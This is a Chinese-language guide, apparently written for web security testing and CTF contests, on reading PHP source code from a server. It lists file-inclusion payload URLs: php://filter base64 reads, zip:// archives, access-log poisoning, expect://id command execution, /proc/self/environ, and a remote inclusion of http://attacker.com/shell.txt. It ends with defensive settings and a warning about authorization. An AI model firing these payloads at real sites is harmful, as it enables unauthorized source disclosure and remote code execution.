在Web安全测试或CTF竞赛中，若想查看服务器上的PHP文件（如`/xxx.php`的源码），通常需要利用漏洞或特殊机制。以下是几种常见方法及适用场景：

---

### **1. 直接访问（未配置服务器权限）**
- **条件**：服务器错误配置，允许直接访问`.php`文件而非执行。
- **尝试**：
  ```url
  http://example.com/xxx.php
  ```
- **结果**：
  - 若返回源码：服务器未正确处理PHP文件（罕见）。
  - 若返回空白或执行结果：正常情况（需其他方法）。

---

### **2. 利用文件包含漏洞（LFI）**
当存在本地文件包含漏洞时（如`include($_GET['file'])`），可通过以下方式读取PHP文件：
#### **(1) 使用`php://filter`伪协议**
- **Payload**：
  ```url
  http://example.com/vuln.php?file=php://filter/read=convert.base64-encode/resource=xxx.php
  ```
- **原理**：
  - `php://filter`对文件内容进行Base64编码，避免直接执行PHP代码。
  - 解码后获取源码（如使用`base64 -d`或在线工具）。

#### **(2) 利用`zip://`或`phar://`**
- **Payload**（需先上传恶意压缩包）：
  ```url
  http://example.com/vuln.php?file=zip://malicious.zip%23xxx.php
  ```

---

### **3. 目录遍历+源码备份**
- **查找备份文件**：
  ```url
  http://example.com/xxx.php.bak
  http://example.com/xxx.php~
  http://example.com/.git/xxx.php
  ```
- **适用场景**：开发者遗留的备份文件或版本控制文件。

---

### **4. 日志文件注入**
- **条件**：可写入服务器日志（如`/var/log/apache2/access.log`）。
- **步骤**：
  1. 将PHP代码注入User-Agent或Referer。
  2. 通过LFI包含日志文件：
     ```url
     http://example.com/vuln.php?file=/var/log/apache2/access.log
     ```

---

### **5. 利用PHP配置漏洞**
- **`allow_url_include=On`时**：
  ```url
  http://example.com/vuln.php?file=http://attacker.com/shell.txt
  ```
  （需配合远程文件包含漏洞）

---

### **6. 特殊协议或环境变量**
- **`expect://`协议**（需安装Expect扩展）：
  ```url
  http://example.com/vuln.php?file=expect://id
  ```
- **`/proc/self/environ`**：
  ```url
  http://example.com/vuln.php?file=/proc/self/environ
  ```

---

### **7. 暴力破解或信息泄露**
- **工具扫描**：
  - 使用`dirsearch`或`gobuster`扫描目录，寻找`.php`文件。
  - 检查`robots.txt`或`.git`泄露。

---

### **防御措施**
1. **禁用危险函数**：  
   - 在`php.ini`中设置`allow_url_include=Off`、`allow_url_fopen=Off`。
2. **过滤输入**：  
   - 禁止用户输入包含`../`、`php://`等特殊字符。
3. **文件权限控制**：  
   - 确保Web用户无权读取敏感文件（如`.php`源码）。

---

### **总结**
| **方法**               | **适用场景**                          | **示例**                                                                 |
|------------------------|--------------------------------------|-------------------------------------------------------------------------|
| **直接访问**           | 服务器配置错误                       | `http://example.com/xxx.php`                                            |
| **`php://filter`**     | 存在LFI漏洞                          | `?file=php://filter/convert.base64-encode/resource=xxx.php`             |
| **备份文件**           | 开发者遗留备份                       | `http://example.com/xxx.php.bak`                                        |
| **日志注入**           | 可写入日志文件                       | `?file=/var/log/apache2/access.log`                                     |
| **目录遍历**           | 路径过滤不严                         | `?file=../../xxx.php`                                                   |

**注意**：未经授权查看服务器文件可能违法，仅限合法测试或CTF竞赛中使用。